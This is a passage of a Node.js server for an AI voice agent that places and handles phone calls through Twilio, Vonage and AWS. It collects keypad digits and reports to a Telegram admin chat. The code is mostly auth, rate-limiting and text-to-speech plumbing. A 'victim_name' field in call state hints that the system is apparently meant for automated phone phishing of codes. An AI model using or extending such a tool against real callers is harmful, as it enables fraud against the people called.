require("dotenv").config();
require("colors");

const express = require("express");
const fetch = require("node-fetch");
const ExpressWs = require("express-ws");
const path = require("path");
const crypto = require("crypto");
const rateLimit = require("express-rate-limit");

const { EnhancedGptService } = require("./routes/gpt");
const { StreamService } = require("./routes/stream");
const { TranscriptionService } = require("./routes/transcription");
const { TextToSpeechService } = require("./routes/tts");
const { VoiceAgentBridge } = require("./routes/voiceAgentBridge");
const { recordingService } = require("./routes/recording");
const { EnhancedSmsService } = require("./routes/sms.js");
const { EmailService } = require("./routes/email");
const { createTwilioGatherHandler } = require("./routes/gather");
const Database = require("./db/db");
const { webhookService } = require("./routes/status");
const twilioSignature = require("./middleware/twilioSignature");
const DynamicFunctionEngine = require("./functions/DynamicFunctionEngine");
const { createDigitCollectionService } = require("./functions/Digit");
const { formatDigitCaptureLabel } = require("./functions/Labels");
const config = require("./config");
const {
  PROVIDER_CHANNELS,
  SUPPORTED_CALL_PROVIDERS,
  SUPPORTED_SMS_PROVIDERS,
  SUPPORTED_EMAIL_PROVIDERS,
  getActiveCallProvider,
  getActiveSmsProvider,
  getActiveEmailProvider,
  getStoredCallProvider,
  getStoredSmsProvider,
  getStoredEmailProvider,
  setActiveCallProvider,
  setActiveSmsProvider,
  setActiveEmailProvider,
  setStoredCallProvider,
  setStoredSmsProvider,
  setStoredEmailProvider,
  normalizeProvider,
} = require("./routes/providerState");
const {
  AwsConnectAdapter,
  AwsTtsAdapter,
  VonageVoiceAdapter,
} = require("./adapters");
const { v4: uuidv4 } = require("uuid");
const { WaveFile } = require("wavefile");

const isProduction = process.env.NODE_ENV === "production";
const appVersion = (() => {
  try {
    return (
      process.env.APP_VERSION ||
      process.env.VERCEL_GIT_COMMIT_SHA ||
      process.env.GIT_SHA ||
      require("./package.json").version ||
      "unknown"
    );
  } catch {
    return "unknown";
  }
})();

const twilio = require("twilio");
const VoiceResponse = twilio.twiml.VoiceResponse;

const DEFAULT_INBOUND_PROMPT =
  "You are an intelligent AI assistant capable of adapting to different business contexts and customer needs. Be professional, helpful, and responsive to customer communication styles. You must add a '•' symbol every 5 to 10 words at natural pauses where your response can be split for text to speech.";
const DEFAULT_INBOUND_FIRST_MESSAGE = "Hello! How can I assist you today?";
const INBOUND_DEFAULT_SETTING_KEY = "inbound_default_script_id";
const INBOUND_DEFAULT_CACHE_MS = 15000;
let inboundDefaultScriptId = null;
let inboundDefaultScript = null;
let inboundDefaultLoadedAt = 0;

const liveConsoleAudioTickMs = Number.isFinite(
  Number(config.liveConsole?.audioTickMs),
)
  ? Number(config.liveConsole?.audioTickMs)
  : 160;
const liveConsoleUserLevelThreshold = Number.isFinite(
  Number(config.liveConsole?.userLevelThreshold),
)
  ? Number(config.liveConsole?.userLevelThreshold)
  : 0.08;
const liveConsoleUserHoldMs = Number.isFinite(
  Number(config.liveConsole?.userHoldMs),
)
  ? Number(config.liveConsole?.userHoldMs)
  : 450;

// Console helpers with clean emoji prefixes (idempotent, minimal noise)
if (!console.__emojiWrapped) {
  const baseLog = console.log.bind(console);
  const baseWarn = console.warn.bind(console);
  const baseError = console.error.bind(console);
  console.log = (...args) => baseLog("📘", ...args);
  console.warn = (...args) => baseWarn("⚠️", ...args);
  console.error = (...args) => baseError("❌", ...args);
  console.__emojiWrapped = true;
}

const HMAC_HEADER_TIMESTAMP = "x-api-timestamp";
const HMAC_HEADER_SIGNATURE = "x-api-signature";
const HMAC_BYPASS_PATH_PREFIXES = [
  "/webhook/",
  "/incoming",
  "/aws/transcripts",
  "/connection",
  "/vonage/stream",
  "/aws/stream",
];

let db;
let digitService;
const functionEngine = new DynamicFunctionEngine();
let smsService = new EnhancedSmsService({
  getActiveProvider: () => getActiveSmsProvider(),
});
let emailService;
const sttFallbackCalls = new Set();
const streamTimeoutCalls = new Set();
const inboundRateBuckets = new Map();
const streamStartTimes = new Map();
const sttFailureCounts = new Map();
const voiceAgentFallbackAttempts = new Map();
const voiceAgentRuntimeByCall = new Map(); // callSid -> runtime guards/state
const activeStreamConnections = new Map();
const streamStartSeen = new Map(); // callSid -> streamSid (dedupe starts)
const streamStopSeen = new Set(); // callSid:streamSid (dedupe stops)
const streamRetryState = new Map(); // callSid -> { attempts, nextDelayMs }
const streamAuthBypass = new Map(); // callSid -> { reason, at }
const streamStatusDedupe = new Map(); // callSid:streamSid:event -> ts
const callStatusDedupe = new Map(); // callSid:status:sequence:timestamp -> ts
const callLifecycle = new Map(); // callSid -> { status, updatedAt }
const streamLastMediaAt = new Map(); // callSid -> timestamp
const sttLastFrameAt = new Map(); // callSid -> timestamp
const streamWatchdogState = new Map(); // callSid -> { noMediaNotifiedAt, noMediaEscalatedAt, sttNotifiedAt }
const providerHealth = new Map();
const keypadProviderGuardWarnings = new Set(); // provider -> warning emitted
const keypadProviderOverrides = new Map(); // scopeKey -> { provider, expiresAt, ... }
const keypadDtmfSeen = new Map(); // callSid -> { seenAt, source, digitsLength }
const keypadDtmfWatchdogs = new Map(); // callSid -> timeoutId
const vonageWebhookJtiCache = new Map(); // jti -> expiresAtMs
let callJobProcessing = false;
let backgroundWorkersStarted = false;
const outboundRateBuckets = new Map(); // namespace:key -> { count, windowStart }
const callLifecycleCleanupTimers = new Map();
const CALL_STATUS_DEDUPE_MS = 3000;
const CALL_STATUS_DEDUPE_MAX = 5000;
const VONAGE_WEBHOOK_JTI_CACHE_MAX = 5000;
const KEYPAD_PROVIDER_OVERRIDE_SETTING_KEY = "keypad_provider_overrides_v1";
const CALL_PROVIDER_SETTING_KEY = "call_provider_v1";
const SMS_PROVIDER_SETTING_KEY = "sms_provider_v1";
const EMAIL_PROVIDER_SETTING_KEY = "email_provider_v1";

function stableStringify(value) {
  if (value === null || typeof value !== "object") {
    return JSON.stringify(value);
  }
  if (Array.isArray(value)) {
    const items = value.map((item) =>
      item === undefined ? "null" : stableStringify(item),
    );
    return `[${items.join(",")}]`;
  }
  const keys = Object.keys(value)
    .filter((key) => value[key] !== undefined)
    .sort();
  const entries = keys.map(
    (key) => `${JSON.stringify(key)}:${stableStringify(value[key])}`,
  );
  return `{${entries.join(",")}}`;
}

function purgeStreamStatusDedupe(callSid) {
  if (!callSid) return;
  const prefix = `${callSid}:`;
  for (const key of streamStatusDedupe.keys()) {
    if (key.startsWith(prefix)) {
      streamStatusDedupe.delete(key);
    }
  }
}

function pruneDedupeMap(map, maxSize) {
  if (map.size <= maxSize) return;
  const entries = [...map.entries()].sort((a, b) => a[1] - b[1]);
  const overflow = entries.length - maxSize;
  for (let i = 0; i < overflow; i += 1) {
    map.delete(entries[i][0]);
  }
}

function buildCallStatusDedupeKey(payload = {}) {
  const callSid = payload.CallSid || payload.callSid || "unknown";
  const status = normalizeCallStatus(
    payload.CallStatus || payload.callStatus || "unknown",
  );
  const sequence =
    payload.SequenceNumber ||
    payload.sequenceNumber ||
    payload.Sequence ||
    payload.sequence ||
    "";
  const timestamp =
    payload.Timestamp ||
    payload.timestamp ||
    payload.EventTimestamp ||
    payload.eventTimestamp ||
    "";
  return `${callSid}:${status}:${sequence}:${timestamp}`;
}

function shouldProcessCallStatusPayload(payload = {}, options = {}) {
  if (options.skipDedupe) return true;
  const callSid = payload.CallSid || payload.callSid;
  if (!callSid) return true;
  const key = buildCallStatusDedupeKey(payload);
  const now = Date.now();
  const lastSeen = callStatusDedupe.get(key);
  if (lastSeen && now - lastSeen < CALL_STATUS_DEDUPE_MS) {
    return false;
  }
  callStatusDedupe.set(key, now);
  pruneDedupeMap(callStatusDedupe, CALL_STATUS_DEDUPE_MAX);
  return true;
}

function purgeCallStatusDedupe(callSid) {
  if (!callSid) return;
  const prefix = `${callSid}:`;
  for (const key of callStatusDedupe.keys()) {
    if (key.startsWith(prefix)) {
      callStatusDedupe.delete(key);
    }
  }
}

function recordCallLifecycle(callSid, status, meta = {}) {
  if (!callSid || !status) return false;
  const normalized = normalizeCallStatus(status);
  const prev = callLifecycle.get(callSid)?.status;
  if (prev === normalized) return false;
  const updatedAt = new Date().toISOString();
  callLifecycle.set(callSid, { status: normalized, updatedAt });
  db?.updateCallState?.(callSid, `status_${normalized}`, {
    status: normalized,
    prev_status: prev || null,
    source: meta.source || null,
    raw_status: meta.raw_status || meta.rawStatus || null,
    answered_by: meta.answered_by || meta.answeredBy || null,
    duration: meta.duration || null,
    at: updatedAt,
  }).catch(() => {});
  return true;
}

function scheduleCallLifecycleCleanup(callSid, delayMs = 10 * 60 * 1000) {
  if (!callSid) return;
  if (callLifecycleCleanupTimers.has(callSid)) {
    clearTimeout(callLifecycleCleanupTimers.get(callSid));
  }
  const timer = setTimeout(() => {
    callLifecycleCleanupTimers.delete(callSid);
    purgeCallStatusDedupe(callSid);
    callLifecycle.delete(callSid);
  }, delayMs);
  callLifecycleCleanupTimers.set(callSid, timer);
}

function normalizeBodyForSignature(req) {
  const method = String(req.method || "GET").toUpperCase();
  if (["GET", "HEAD"].includes(method)) {
    return "";
  }
  const contentLength = Number(req.headers["content-length"] || 0);
  const hasBody = Number.isFinite(contentLength) && contentLength > 0;
  if (!req.body || Object.keys(req.body).length === 0) {
    return hasBody ? stableStringify(req.body || {}) : "";
  }
  return stableStringify(req.body);
}

function buildHmacPayload(req, timestamp) {
  const method = String(req.method || "GET").toUpperCase();
  const path = req.originalUrl || req.url || "/";
  const body = normalizeBodyForSignature(req);
  return `${timestamp}.${method}.${path}.${body}`;
}

function normalizePhoneDigits(value) {
  return String(value || "").replace(/\D/g, "");
}

function normalizePhoneForFlag(value) {
  const digits = normalizePhoneDigits(value);
  if (!digits) return null;
  return `+${digits}`;
}

function getInboundRateKey(req, payload = {}) {
  const from =
    payload.From || payload.from || payload.Caller || payload.caller || null;
  const normalized = normalizePhoneForFlag(from);
  if (normalized) return normalized;
  return req?.ip || req?.headers?.["x-forwarded-for"] || "unknown";
}

function shouldRateLimitInbound(req, payload = {}) {
  const max = Number(config.inbound?.rateLimitMax) || 0;
  const windowMs = Number(config.inbound?.rateLimitWindowMs) || 60000;
  if (!Number.isFinite(max) || max <= 0) {
    return { limited: false, key: null };
  }
  const key = getInboundRateKey(req, payload);
  const now = Date.now();
  const bucket = inboundRateBuckets.get(key);
  if (!bucket || now - bucket.windowStart >= windowMs) {
    inboundRateBuckets.set(key, { count: 1, windowStart: now });
    return { limited: false, key };
  }
  bucket.count += 1;
  inboundRateBuckets.set(key, bucket);
  return {
    limited: bucket.count > max,
    key,
    count: bucket.count,
    resetAt: bucket.windowStart + windowMs,
  };
}

function normalizeTwilioDirection(value) {
  return String(value || "")
    .trim()
    .toLowerCase();
}

function isOutboundTwilioDirection(value) {
  const direction = normalizeTwilioDirection(value);
  return direction ? direction.startsWith("outbound") : false;
}

function resolveInboundRoute(toNumber) {
  const routes = config.inbound?.routes || {};
  if (!toNumber || !routes || typeof routes !== "object") return null;
  const normalizedTo = normalizePhoneDigits(toNumber);
  if (!normalizedTo) return routes[toNumber] || null;

  if (routes[toNumber]) return routes[toNumber];
  if (routes[normalizedTo]) return routes[normalizedTo];
  if (routes[`+${normalizedTo}`]) return routes[`+${normalizedTo}`];

  for (const [key, value] of Object.entries(routes)) {
    if (normalizePhoneDigits(key) === normalizedTo) {
      return value;
    }
  }
  return null;
}

function buildInboundDefaults(route = {}) {
  const fallbackPrompt =
    config.inbound?.defaultPrompt || DEFAULT_INBOUND_PROMPT;
  const fallbackFirst =
    config.inbound?.defaultFirstMessage || DEFAULT_INBOUND_FIRST_MESSAGE;
  const prompt = route.prompt || inboundDefaultScript?.prompt || fallbackPrompt;
  const firstMessage =
    route.first_message ||
    route.firstMessage ||
    inboundDefaultScript?.first_message ||
    fallbackFirst;
  return { prompt, firstMessage };
}

function buildInboundCallConfig(callSid, payload = {}, options = {}) {
  const provider = String(options.provider || "twilio").toLowerCase();
  const inbound = options.inbound !== false;
  const route =
    resolveInboundRoute(
      payload.To || payload.to || payload.called || payload.Called,
    ) || {};
  const routeLabel = route.label || route.name || route.route_label || null;
  const { prompt, firstMessage } = buildInboundDefaults(route);
  const functionSystem = functionEngine.generateAdaptiveFunctionSystem(
    prompt,
    firstMessage,
  );
  const createdAt = new Date().toISOString();
  const hasRoutePrompt = Boolean(
    route.prompt || route.first_message || route.firstMessage,
  );
  const fallbackScript = !hasRoutePrompt ? inboundDefaultScript : null;
  const callConfig = {
    prompt,
    first_message: firstMessage,
    created_at: createdAt,
    user_chat_id: config.telegram?.adminChatId || route.user_chat_id || null,
    customer_name: route.customer_name || null,
    provider,
    provider_metadata: null,
    business_context: route.business_context || functionSystem.context,
    function_count: functionSystem.functions.length,
    purpose: route.purpose || null,
    business_id: route.business_id || null,
    route_label: routeLabel,
    script: route.script || fallbackScript?.name || null,
    script_id: route.script_id || fallbackScript?.id || null,
    emotion: route.emotion || null,
    urgency: route.urgency || null,
    technical_level: route.technical_level || null,
    voice_model: route.voice_model || null,
    collection_profile: route.collection_profile || null,
    collection_expected_length: route.collection_expected_length || null,
    collection_timeout_s: route.collection_timeout_s || null,
    collection_max_retries: route.collection_max_retries || null,
    collection_mask_for_gpt: route.collection_mask_for_gpt,
    collection_speak_confirmation: route.collection_speak_confirmation,
    firstMediaTimeoutMs:
      route.first_media_timeout_ms ||
      route.firstMediaTimeoutMs ||
      config.inbound?.firstMediaTimeoutMs ||
      null,
    flow_state: "normal",
    flow_state_updated_at: createdAt,
    call_mode: "normal",
    digit_capture_active: false,
    inbound,
  };
  return { callConfig, functionSystem };
}

async function refreshInboundDefaultScript(force = false) {
  if (!db) return null;
  const now = Date.now();
  if (
    !force &&
    inboundDefaultLoadedAt &&
    now - inboundDefaultLoadedAt < INBOUND_DEFAULT_CACHE_MS
  ) {
    return inboundDefaultScript;
  }
  inboundDefaultLoadedAt = now;

  let settingValue = null;
  try {
    settingValue = await db.getSetting(INBOUND_DEFAULT_SETTING_KEY);
  } catch (error) {
    console.error("Failed to load inbound default setting:", error);
  }

  if (!settingValue || settingValue === "builtin") {
    inboundDefaultScriptId = null;
    inboundDefaultScript = null;
    return inboundDefaultScript;
  }

  const scriptId = Number(settingValue);
  if (!Number.isFinite(scriptId)) {
    inboundDefaultScriptId = null;
    inboundDefaultScript = null;
    return inboundDefaultScript;
  }

  try {
    const script = await db.getCallTemplateById(scriptId);
    if (!script) {
      inboundDefaultScriptId = null;
      inboundDefaultScript = null;
      return inboundDefaultScript;
    }
    inboundDefaultScriptId = scriptId;
    inboundDefaultScript = script;
  } catch (error) {
    console.error("Failed to load inbound default script:", error);
    inboundDefaultScriptId = null;
    inboundDefaultScript = null;
  }
  return inboundDefaultScript;
}

function ensureCallSetup(callSid, payload = {}, options = {}) {
  let callConfig = callConfigurations.get(callSid);
  let functionSystem = callFunctionSystems.get(callSid);
  if (callConfig && functionSystem) {
    return { callConfig, functionSystem, created: false };
  }

  if (!callConfig) {
    const created = buildInboundCallConfig(callSid, payload, options);
    callConfig = created.callConfig;
    functionSystem = functionSystem || created.functionSystem;
  } else if (!functionSystem) {
    const { prompt, first_message } = callConfig;
    const promptValue = prompt || DEFAULT_INBOUND_PROMPT;
    const firstValue = first_message || DEFAULT_INBOUND_FIRST_MESSAGE;
    functionSystem = functionEngine.generateAdaptiveFunctionSystem(
      promptValue,
      firstValue,
    );
  }

  callConfigurations.set(callSid, callConfig);
  callFunctionSystems.set(callSid, functionSystem);
  return { callConfig, functionSystem, created: true };
}

async function ensureCallRecord(
  callSid,
  payload = {},
  source = "unknown",
  setupOptions = {},
) {
  if (!db || !callSid) return null;
  const setup = ensureCallSetup(callSid, payload, setupOptions);
  const existing = await db.getCall(callSid).catch(() => null);
  if (existing) return existing;

  const { callConfig, functionSystem } = setup;
  const inbound = callConfig?.inbound !== false;
  const direction = inbound ? "inbound" : "outbound";
  const from =
    payload.From || payload.from || payload.Caller || payload.caller || null;
  const to =
    payload.To || payload.to || payload.Called || payload.called || null;

  try {
    await db.createCall({
      call_sid: callSid,
      phone_number: from || null,
      prompt: callConfig.prompt,
      first_message: callConfig.first_message,
      user_chat_id: callConfig.user_chat_id || null,
      business_context: JSON.stringify(functionSystem?.context || {}),
      generated_functions: JSON.stringify(
        (functionSystem?.functions || [])
          .map((f) => f.function?.name || f.function?.function?.name || f.name)
          .filter(Boolean),
      ),
      direction,
    });
    await db.updateCallState(callSid, "call_created", {
      inbound,
      source,
      from: from || null,
      to: to || null,
      provider: callConfig.provider || "twilio",
      provider_metadata: callConfig.provider_metadata || null,
      business_id: callConfig.business_id || null,
      route_label: callConfig.route_label || null,
      purpose: callConfig.purpose || null,
      voice_model: callConfig.voice_model || null,
    });
    return await db.getCall(callSid);
  } catch (error) {
    console.error("Failed to create inbound call record:", error);
    return null;
  }
}

async function hydrateCallConfigFromDb(callSid) {
  if (!db || !callSid) return null;
  const call = await db.getCall(callSid).catch(() => null);
  if (!call) return null;
  let state = null;
  try {
    state = await db.getLatestCallState(callSid, "call_created");
  } catch (_) {
    state = null;
  }
  let parsedContext = null;
  if (call?.business_context) {
    try {
      parsedContext = JSON.parse(call.business_context);
    } catch (_) {
      parsedContext = null;
    }
  }
  const prompt = call.prompt || DEFAULT_INBOUND_PROMPT;
  const firstMessage = call.first_message || DEFAULT_INBOUND_FIRST_MESSAGE;
  const functionSystem = functionEngine.generateAdaptiveFunctionSystem(
    prompt,
    firstMessage,
  );
  const createdAt = call.created_at || new Date().toISOString();
  const callConfig = {
    prompt,
    first_message: firstMessage,
    created_at: createdAt,
    user_chat_id: call.user_chat_id || null,
    customer_name: state?.customer_name || state?.victim_name || null,
    provider: state?.provider || currentProvider,
    provider_metadata: state?.provider_metadata || null,
    business_context:
      state?.business_context || parsedContext || functionSystem.context,
    function_count: functionSystem.functions.length,
    purpose: state?.purpose || null,
    business_id: state?.business_id || null,
    script: state?.script || null,
    script_id: state?.script_id || null,
    emotion: state?.emotion || null,
    urgency: state?.urgency || null,
    technical_level: state?.technical_level || null,
    voice_model: state?.voice_model || null,
    collection_profile: state?.collection_profile || null,
    collection_expected_length: state?.collection_expected_length || null,
    collection_timeout_s: state?.collection_timeout_s || null,
    collection_max_retries: state?.collection_max_retries || null,
    collection_mask_for_gpt: state?.collection_mask_for_gpt,
    collection_speak_confirmation: state?.collection_speak_confirmation,
    script_policy: state?.script_policy || null,
    flow_state: state?.flow_state || "normal",
    flow_state_updated_at: state?.flow_state_updated_at || createdAt,
    call_mode: state?.call_mode || "normal",
    digit_capture_active: false,
    inbound: false,
  };

  callConfigurations.set(callSid, callConfig);
  callFunctionSystems.set(callSid, functionSystem);
  return { callConfig, functionSystem };
}

function buildStreamAuthToken(callSid, timestamp) {
  const secret = config.streamAuth?.secret;
  if (!secret) return null;
  const payload = `${callSid}.${timestamp}`;
  return crypto.createHmac("sha256", secret).update(payload).digest("hex");
}

function resolveStreamAuthParams(req, extraParams = null) {
  const result = {};
  if (req?.query && Object.keys(req.query).length) {
    Object.assign(result, req.query);
  } else {
    const url = req?.url || "";
    const queryIndex = url.indexOf("?");
    if (queryIndex !== -1) {
      const params = new URLSearchParams(url.slice(queryIndex + 1));
      for (const [key, value] of params.entries()) {
        result[key] = value;
      }
    }
  }
  if (extraParams && typeof extraParams === "object") {
    for (const [key, value] of Object.entries(extraParams)) {
      if (value === undefined || value === null || value === "") continue;
      result[key] = String(value);
    }
  }
  return result;
}

function verifyStreamAuth(callSid, req, extraParams = null) {
  const secret = config.streamAuth?.secret;
  if (!secret) return { ok: true, skipped: true, reason: "missing_secret" };
  const params = resolveStreamAuthParams(req, extraParams);
  const token = params.token || params.signature;
  const timestamp = Number(params.ts || params.timestamp);
  if (!token || !Number.isFinite(timestamp)) {
    return { ok: false, reason: "missing_token" };
  }
  const maxSkewMs = Number(config.streamAuth?.maxSkewMs || 300000);
  const now = Date.now();
  if (Math.abs(now - timestamp) > maxSkewMs) {
    return { ok: false, reason: "timestamp_out_of_range" };
  }
  const expected = buildStreamAuthToken(callSid, String(timestamp));
  if (!expected) return { ok: false, reason: "missing_secret" };
  try {
    const expectedBuf = Buffer.from(expected, "hex");
    const providedBuf = Buffer.from(String(token), "hex");
    if (expectedBuf.length !== providedBuf.length) {
      return { ok: false, reason: "invalid_signature" };
    }
    if (!crypto.timingSafeEqual(expectedBuf, providedBuf)) {
      return { ok: false, reason: "invalid_signature" };
    }
  } catch (error) {
    return { ok: false, reason: "invalid_signature" };
  }
  return { ok: true };
}

function clearCallEndLock(callSid) {
  if (callEndLocks.has(callSid)) {
    callEndLocks.delete(callSid);
  }
}

function clearSilenceTimer(callSid) {
  const timer = silenceTimers.get(callSid);
  if (timer) {
    clearTimeout(timer);
    silenceTimers.delete(callSid);
  }
}

function isCaptureActiveConfig(callConfig) {
  if (!callConfig) return false;
  const flowState = callConfig.flow_state;
  if (flowState === "capture_active" || flowState === "capture_pending") {
    return true;
  }
  if (callConfig.call_mode === "dtmf_capture") {
    return true;
  }
  return (
    callConfig?.digit_intent?.mode === "dtmf" &&
    callConfig?.digit_capture_active === true
  );
}

function isCaptureActive(callSid) {
  if (!callSid) return false;
  const callConfig = callConfigurations.get(callSid);
  return isCaptureActiveConfig(callConfig);
}

function resolveVoiceModel(callConfig) {
  const model = callConfig?.voice_model;
  if (model && typeof model === "string" && model.trim()) {
    return model.trim();
  }
  return null;
}

function resolveTwilioSayVoice(callConfig) {
  const model = resolveVoiceModel(callConfig);
  if (!model) return null;
  const normalized = model.toLowerCase();
  if (["alice", "man", "woman"].includes(normalized)) {
    return model;
  }
  if (model.startsWith("Polly.")) {
    return model;
  }
  return null;
}

function resolveDeepgramVoiceModel(callConfig) {
  const model = callConfig?.voice_model;
  if (model && typeof model === "string") {
    const normalized = model.toLowerCase();
    if (
      !["alice", "man", "woman"].includes(normalized) &&
      !model.startsWith("Polly.")
    ) {
      return model;
    }
  }
  return config.deepgram?.voiceModel || "aura-asteria-en";
}

function shouldUseTwilioPlay(callConfig) {
  if (!config.deepgram?.apiKey) return false;
  if (!config.server?.hostname) return false;
  if (config.twilio?.ttsPlayEnabled === false) return false;
  return true;
}

function normalizeTwilioTtsText(text = "") {
  const cleaned = String(text || "").trim();
  if (!cleaned) return "";
  if (cleaned.length > TWILIO_TTS_MAX_CHARS) {
    return "";
  }
  return cleaned;
}

function buildTwilioTtsCacheKey(text, voiceModel) {
  return crypto
    .createHash("sha256")
    .update(`${voiceModel}::${text}`)
    .digest("hex");
}

function pruneTwilioTtsCache() {
  const now = Date.now();
  for (const [key, entry] of twilioTtsCache.entries()) {
    if (!entry || entry.expiresAt <= now) {
      twilioTtsCache.delete(key);
    }
  }
  if (twilioTtsCache.size <= TWILIO_TTS_CACHE_MAX) return;
  const entries = Array.from(twilioTtsCache.entries()).sort(
    (a, b) => (a[1]?.createdAt || 0) - (b[1]?.createdAt || 0),
  );
  const overflow = twilioTtsCache.size - TWILIO_TTS_CACHE_MAX;
  for (let i = 0; i < overflow; i += 1) {
    const entry = entries[i];
    if (entry) {
      twilioTtsCache.delete(entry[0]);
    }
  }
}

async function synthesizeTwilioTtsAudio(text, voiceModel) {
  const model = voiceModel || resolveDeepgramVoiceModel(null);
  const url = `https://api.deepgram.com/v1/speak?model=${encodeURIComponent(model)}&encoding=mulaw&sample_rate=8000&container=none`;
  const response = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Token ${config.deepgram.apiKey}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ text }),
    timeout: TWILIO_TTS_FETCH_TIMEOUT_MS,
  });
  if (!response.ok) {
    const errorText = await response.text();
    console.error(
      "Deepgram TTS error:",
      response.status,
      response.statusText,
      errorText,
    );
    return null;
  }
  const arrayBuffer = await response.arrayBuffer();
  const mulawBuffer = Buffer.from(arrayBuffer);
  const wav = new WaveFile();
  wav.fromScratch(1, 8000, "8m", mulawBuffer);
  return {
    buffer: Buffer.from(wav.toBuffer()),
    contentType: "audio/wav",
  };
}

async function getTwilioTtsAudioUrl(text, callConfig, options = {}) {
  const cleaned = normalizeTwilioTtsText(text);
  if (!cleaned) return null;
  if (!shouldUseTwilioPlay(callConfig)) return null;
  const cacheOnly = options?.cacheOnly === true;
  const voiceModel = resolveDeepgramVoiceModel(callConfig);
  const key = buildTwilioTtsCacheKey(cleaned, voiceModel);
  const now = Date.now();
  const cached = twilioTtsCache.get(key);
  if (cached && cached.expiresAt > now) {
    return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
  }
  const pending = twilioTtsPending.get(key);
  if (pending) {
    if (cacheOnly) {
      return null;
    }
    await pending;
    const refreshed = twilioTtsCache.get(key);
    if (refreshed && refreshed.expiresAt > Date.now()) {
      return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
    }
    return null;
  }
  if (cacheOnly) {
    const job = (async () => {
      try {
        const audio = await synthesizeTwilioTtsAudio(cleaned, voiceModel);
        if (!audio) return;
        twilioTtsCache.set(key, {
          ...audio,
          createdAt: Date.now(),
          expiresAt: Date.now() + TWILIO_TTS_CACHE_TTL_MS,
        });
        pruneTwilioTtsCache();
      } catch (err) {
        console.error("Twilio TTS synthesis error:", err);
      }
    })();
    twilioTtsPending.set(key, job);
    job.finally(() => {
      if (twilioTtsPending.get(key) === job) {
        twilioTtsPending.delete(key);
      }
    });
    return null;
  }
  const job = (async () => {
    try {
      const audio = await synthesizeTwilioTtsAudio(cleaned, voiceModel);
      if (!audio) return;
      twilioTtsCache.set(key, {
        ...audio,
        createdAt: Date.now(),
        expiresAt: Date.now() + TWILIO_TTS_CACHE_TTL_MS,
      });
      pruneTwilioTtsCache();
    } catch (err) {
      console.error("Twilio TTS synthesis error:", err);
    }
  })();
  twilioTtsPending.set(key, job);
  await job;
  twilioTtsPending.delete(key);
  const refreshed = twilioTtsCache.get(key);
  if (refreshed && refreshed.expiresAt > Date.now()) {
    return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
  }
  return null;
}

async function getTwilioTtsAudioUrlSafe(text, callConfig, timeoutMs = 1200) {
  const safeTimeoutMs =
    Number.isFinite(timeoutMs) && timeoutMs > 0 ? timeoutMs : 0;
  if (!safeTimeoutMs) {
    return getTwilioTtsAudioUrl(text, callConfig);
  }
  const timeoutPromise = new Promise((resolve) => {
    setTimeout(() => resolve(null), safeTimeoutMs);
  });
  try {
    return await Promise.race([
      getTwilioTtsAudioUrl(text, callConfig),
      timeoutPromise,
    ]);
  } catch (error) {
    console.error("Twilio TTS timeout fallback:", error);
    return null;
  }
}

function maskDigitsForLog(input = "") {
  const digits = String(input || "").replace(/\D/g, "");
  if (!digits) return "0 digits";
  return `${digits.length} digits`;
}

function maskPhoneForLog(input = "") {
  const digits = String(input || "").replace(/\D/g, "");
  if (!digits) return "unknown";
  const tail = digits.slice(-4);
  return `***${tail}`;
}

function maskSmsBodyForLog(body = "") {
  const text = String(body || "").replace(/\s+/g, " ").trim();
  if (!text) return "[empty len=0]";
  const digest = crypto
    .createHash("sha256")
    .update(text)
    .digest("hex")
    .slice(0, 12);
  return `[len=${text.length} sha=${digest}]`;
}

function redactSensitiveLogValue(input = "") {
  let text = String(input || "");
  if (!text) return "unknown";
  text = text.replace(/\+?\d[\d\s().-]{6,}\d/g, (match) => {
    const digits = String(match || "").replace(/\D/g, "");
    if (digits.length < 4) return "[redacted-phone]";
    return `***${digits.slice(-2)}`;
  });
  text = text.replace(
    /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi,
    "[redacted-email]",
  );
  if (text.length > 220) {
    return `${text.slice(0, 200)}...[redacted]`;
  }
  return text;
}

function normalizeRequestId(value = "") {
  const candidate = String(value || "").trim();
  if (!candidate) return null;
  if (candidate.length > 80) return null;
  if (!/^[A-Za-z0-9._:-]+$/.test(candidate)) return null;
  return candidate;
}

function buildApiError(code, message, requestId = null, extra = {}) {
  return {
    success: false,
    error: message,
    code,
    ...(requestId ? { request_id: requestId } : {}),
    ...(extra || {}),
  };
}

function sendApiError(res, status, code, message, requestId = null, extra = {}) {
  return res.status(status).json(buildApiError(code, message, requestId, extra));
}

function getOutboundActorKey(req, explicitValue = null) {
  const explicit = String(explicitValue || "").trim();
  if (explicit) return explicit;
  const bodyUser = String(req?.body?.user_chat_id || req?.body?.userChatId || "").trim();
  if (bodyUser) return bodyUser;
  const tenant = String(req?.body?.tenant_id || req?.body?.tenantId || "").trim();
  if (tenant) return `tenant:${tenant}`;
  return String(req?.ip || req?.headers?.["x-forwarded-for"] || "anonymous");
}

async function checkOutboundRateLimit(scope, key, limit, windowMs) {
  const safeLimit = Number(limit);
  const safeWindowMs = Number(windowMs);
  if (!Number.isFinite(safeLimit) || safeLimit <= 0) {
    return { allowed: true };
  }
  if (!Number.isFinite(safeWindowMs) || safeWindowMs <= 0) {
    return { allowed: true };
  }

  if (db?.checkAndConsumeOutboundRateLimit) {
    try {
      return await db.checkAndConsumeOutboundRateLimit({
        scope,
        key,
        limit: safeLimit,
        windowMs: safeWindowMs,
        nowMs: Date.now(),
      });
    } catch (error) {
      console.error("outbound_rate_limit_store_error", {
        scope: String(scope || "unknown"),
        key: redactSensitiveLogValue(String(key || "anonymous")),
        reason: redactSensitiveLogValue(error?.message || "unknown"),
      });
    }
  }

  const now = Date.now();
  if (outboundRateBuckets.size > 5000) {
    for (const [entryKey, entry] of outboundRateBuckets.entries()) {
      if (!entry || now - entry.windowStart >= safeWindowMs * 2) {
        outboundRateBuckets.delete(entryKey);
      }
    }
  }
  const bucketKey = `${scope}:${key}`;
  const existing = outboundRateBuckets.get(bucketKey);
  if (!existing || now - existing.windowStart >= safeWindowMs) {
    outboundRateBuckets.set(bucketKey, {
      count: 1,
      windowStart: now,
    });
    return { allowed: true };
  }
  if (existing.count >= safeLimit) {
    const retryAfterMs = Math.max(0, safeWindowMs - (now - existing.windowStart));
    return { allowed: false, retryAfterMs };
  }
